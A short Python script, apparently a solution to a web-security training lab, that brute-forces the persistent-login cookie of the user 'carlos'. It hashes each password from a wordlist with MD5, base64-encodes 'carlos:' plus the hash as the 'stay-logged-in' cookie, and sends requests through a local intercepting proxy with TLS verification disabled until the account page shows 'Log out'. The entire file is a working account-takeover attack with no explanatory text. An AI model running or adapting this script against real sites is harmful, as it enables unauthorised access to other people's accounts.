import requests
import sys
import urllib3
import hashlib
import base64

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}

def access_carlos_account(url):
    print("(+) Brute-forcing Carlos's password.....")
    with open('password.txt','r') as file:
        for pwd in file:
            hashed_pwd = 'carlos:'+ hashlib.md5(pwd.rstrip('\r\n').encode("utf-8")).hexdigest()
            encoded_pwd = base64.b64encode(bytes(hashed_pwd, "utf-8"))
            str_pwd = encoded_pwd.decode("utf-8")

            #perform the request
            r = requests.session()
            myaccount = url + '/my-account?id=carlos'
            cookies = {"stay-logged-in":str_pwd}
            res = r.get(myaccount, cookies=cookies, proxies=proxies, verify=False)
            if "Log out" in res.text:
                print("(+) Carlos's password is "+pwd)
                sys.exit(-1)
            
        print("(-) Unable to find password")


def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    access_carlos_account(url)

if __name__ == "__main__":
    main()